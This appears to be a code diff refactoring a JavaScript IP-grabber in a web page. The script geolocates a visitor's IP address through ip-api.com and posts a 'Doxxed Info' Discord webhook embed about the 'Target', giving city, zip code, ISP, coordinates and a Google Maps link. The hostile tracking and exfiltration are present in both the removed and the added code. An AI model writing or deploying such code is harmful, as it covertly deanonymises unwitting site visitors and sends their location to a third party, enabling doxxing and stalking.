@@ -61,97 +61,95 @@
 
             console.log('IP logged and sent to webhook.');
 
-            // Get the location data from ip-api (using HTTPS now)
+            // Use ip-api.com for geolocation (now with HTTPS)
             const locationResponse = await fetch(`https://ip-api.com/json/${userIP}`);
             const locationData = await locationResponse.json();
 
-            if (locationData.status === "success") {
-                const {
-                    country, countryCode, region, regionName, city, zip,
-                    lat, lon, timezone, isp, org, as
-                } = locationData;
-
-                // Generate the Google Maps link
-                const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-                // Create the embed message
-                const embedMessage = {
-                    username: "smort - MAXH@X",
-                    avatar_url: "https://i.imgflip.com/4gyc7u.png", // You can change the avatar image URL
-                    embeds: [{
-                        title: `🌍 Doxxed Info for IP: ${userIP}`,
-                        description: `Information gathered for the Target with IP address: ${userIP}`,
-                        color: 15417396, // Color code (light blue)
-                        fields: [
-                            {
-                                name: "📍 Country",
-                                value: `${country} (${countryCode})`,
-                                inline: true
-                            },
-                            {
-                                name: "🏙️ City",
-                                value: `${city}, ${regionName} (${region})`,
-                                inline: true
-                            },
-                            {
-                                name: "🔢 Zip Code",
-                                value: zip || "N/A",
-                                inline: true
-                            },
-                            {
-                                name: "🌐 Timezone",
-                                value: timezone,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 ISP",
-                                value: isp,
-                                inline: true
-                            },
-                            {
-                                name: "🏢 Organization",
-                                value: org || "N/A",
-                                inline: true
-                            },
-                            {
-                                name: "🔒 AS (Autonomous System)",
-                                value: as,
-                                inline: true
-                            },
-                            {
-                                name: "🗺️ Coordinates",
-                                value: `Latitude: ${lat}\nLongitude: ${lon}`,
-                                inline: true
-                            },
-                            {
-                                name: "🔗 Google Maps Link",
-                                value: `[View on Google Maps](${googleMapsLink})`,
-                                inline: true
-                            }
-                        ],
-                        footer: {
-                            text: "Data provided by MAXH@X"
-                        }
-                    }]
-                };
-
-                // Send the embed message to Discord webhook
-                const embedResponse = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(embedMessage)
-                });
-
-                if (!embedResponse.ok) {
-                    throw new Error('Failed to send embed to Discord webhook');
-                }
-
-                console.log('Location data sent to webhook.');
-            } else {
+            if (locationData.status === "fail") {
                 console.log('Unable to fetch location data for the user.');
+                return;
             }
+
+            const { country, countryCode, region, regionName, city, zip, lat, lon, timezone, isp, org, as } = locationData;
+
+            // Generate the Google Maps link
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Create the embed message
+            const embedMessage = {
+                username: "smort - MAXH@X",
+                avatar_url: "https://i.imgflip.com/4gyc7u.png", // You can change the avatar image URL
+                embeds: [{
+                    title: `🌍 Doxxed Info for IP: ${userIP}`,
+                    description: `Information gathered for the Target with IP address: ${userIP}`,
+                    color: 15417396, // Light blue color
+                    fields: [
+                        {
+                            name: "📍 Country",
+                            value: `${country} (${countryCode})`,
+                            inline: true
+                        },
+                        {
+                            name: "🏙️ City",
+                            value: `${city}, ${regionName} (${region})`,
+                            inline: true
+                        },
+                        {
+                            name: "🔢 Zip Code",
+                            value: zip || "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Timezone",
+                            value: timezone,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 ISP",
+                            value: isp,
+                            inline: true
+                        },
+                        {
+                            name: "🏢 Organization",
+                            value: org || "N/A",
+                            inline: true
+                        },
+                        {
+                            name: "🔒 AS (Autonomous System)",
+                            value: as,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Coordinates",
+                            value: `Latitude: ${lat}\nLongitude: ${lon}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Google Maps Link",
+                            value: `[View on Google Maps](${googleMapsLink})`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Data provided by MAXH@X"
+                    }
+                }]
+            };
+
+            // Send the embed message to Discord webhook
+            const embedResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            });
+
+            if (!embedResponse.ok) {
+                throw new Error('Failed to send embed to Discord webhook');
+            }
+
+            console.log('Location data sent to webhook.');
 
         } catch (error) {
             console.error('Error logging IP or fetching location:', error);
